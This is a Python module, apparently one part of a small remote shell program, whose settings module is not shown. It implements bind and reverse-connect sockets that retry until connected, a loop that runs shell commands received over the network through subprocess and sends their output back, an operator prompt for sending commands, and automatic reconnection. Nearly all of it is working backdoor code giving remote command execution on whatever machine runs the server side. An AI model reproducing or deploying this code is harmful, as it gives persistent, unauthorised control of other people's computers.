import socket as SocketLib
import S
import F
import subprocess
import time as Time
import CS

def Bind(Socket, Ip, Port):
    try:
        Socket.bind((Ip, Port))
    except:
        return S.ErrorCode
    return S.SuccessfulCode

def SendAndEncode(Socket, Message): return Socket.send(Message.encode())

def Send(Socket, Message): return Socket.send(Message)

def CreateSocket(Ipv, Protocol): return SocketLib.socket(Ipv, Protocol)

def RecvAndDecode(Socket, Frame): 
    Message = Socket.recv(Frame).decode()
    return Message

def Recv(Socket, Frame): return Socket.recv(Frame)

def CheckAndPrint(Message):
    if S.DebugOutputFlag:
        print(Message)



        

def CreateStart(BC):

    Socket = SocketLib.socket(S.IpV, S.Protocol)

    if BC == S.BindCode:

        if Socket.bind((S.AcceptingIp, S.ServerPort)) == S.ErrorCode:
            return S.ErrorCode
        Socket.listen(S.ServerQueue)
        ClientSocket, ClientInfo = Socket.accept()
        F.CheckAndPrint(S.AcceptMSG) 
        F.CheckAndPrint(ClientInfo)
        return Socket, ClientSocket

    elif BC == S.ConnectCode:
        
        F.ConnectionLoop(Socket, S.ServerIp, S.ServerPort)
        return Socket

        
def ConnectionLoop(Socket, Ip, Port):
    while True:
        try:
            Socket.connect((Ip, Port))
            return
        except:
            F.CheckAndPrint(S.ConnectErrorMSG)
            F.CheckAndPrint(S.TimeoutMSG)
            Time.sleep(S.Timeout)

def CommandLoop(Socket):
    Message = S.VoidString

    while Message != S.ClientEndCommand:
        F.CheckAndPrint(S.OutputSplitter)


        Message = S.VoidString
        while Message == S.VoidString:
            Message = input()
   
        if Message == S.ClientEndCommand:
            Socket.close()
            return S.SuccessfulCode

        try:
            F.SendAndEncode(Socket, Message)
        except:
            F.CheckAndPrint(S.SendErrorMSG)
        Output = F.RecvAndDecode(Socket, S.Frame)
        F.CheckAndPrint(Output)

def GetAndExecute(ServerSocket, ClientSocket):

    OutputSplitter = S.OutputSplitter
    DefaultShell = S.VoidString
    ShellCommandSplitter = S.NDefaultShellCommandSplitter
    Message = S.VoidString

    while Message != S.ServerEndCommand:
        CommandOutput = S.VoidString
        Message = S.VoidString
        F.CheckAndPrint(S.OutputSplitter)


        F.CheckAndPrint(S.CommandWaitingMSG)
        Message = F.RecvAndDecode(ClientSocket, S.Frame)
        #Message = ClientSocket.recv(Frame).decode()
        F.CheckAndPrint(Message)

        if Message == S.VoidString:
            F.CheckAndPrint(S.RefusedConnectionMSG)
            return S.ErrorCode
        


        #F.CheckAndPrint(S.RecvErrorMSG)
        #return S.ErrorCode

        if Message == S.SetDefaultShellCommand:
            F.SendAndEncode(ClientSocket, S.SetDefaultShellCommandMSG)
            DefaultShell = F.RecvAndDecode(ClientSocket, S.Frame) 

            if DefaultShell == S.RemoveDefaultShell:
                DefaultShell = S.VoidString
                F.CheckAndPrint(S.RemovedDefaultShellMSG)
                ShellCommandSplitter = S.NDefaultShellCommandSplitter
                F.SendAndEncode(ClientSocket, S.RemovedDefaultShellMSG)

            else:
                ShellCommandSplitter = S.YDefaultShellCommandSplitter # " "
                F.SendAndEncode(ClientSocket, S.DefaultShellMSG + S.SpaceSplitChar + DefaultShell)

        else:
            Command = DefaultShell + ShellCommandSplitter + Message

            try:
                F.CheckAndPrint(Command)
                CommandOutput = str(subprocess.run(Command, stdout=subprocess.PIPE))
                F.CheckAndPrint(CommandOutput)

            except:
                F.SendAndEncode(ClientSocket, S.ShellErrorMSG)

            F.SendAndEncode(ClientSocket, CommandOutput)
            F.CheckAndPrint(S.OutputSplitter)



    ServerSocket.close()
    ClientSocket.close()

    return S.SuccessfulCode

def KeepConnectLoop(Func):
    ReturnCode = S.VoidRetCode

    while ReturnCode != S.SuccessfulCode:
        F.CheckAndPrint(S.TimeoutMSG)
        Time.sleep(S.Timeout)
        ReturnCode = Func()
        F.CheckAndPrint(S.RestartMSG)
